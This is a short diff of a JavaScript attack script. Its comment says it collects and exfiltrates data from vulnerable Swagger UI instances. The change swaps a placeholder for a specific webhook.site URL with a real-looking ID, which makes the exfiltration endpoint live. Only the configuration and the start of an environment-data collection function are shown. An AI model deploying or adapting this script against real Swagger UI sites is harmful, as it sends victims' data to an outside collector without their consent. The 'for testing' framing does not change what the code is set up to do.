@@ -2,7 +2,7 @@
 // This script collects and exfiltrates data from vulnerable Swagger UI instances
 
 // Configuration - Replace with your own webhook URL for testing
-const WEBHOOK_URL = "https://webhook.site/YOUR-WEBHOOK-ID";
+const WEBHOOK_URL = "https://webhook.site/9f06dd69-358d-45e5-b1f2-2b9066dd2b0f";
 
 // Collect detailed environment information
 const collectEnvironmentData = () => {
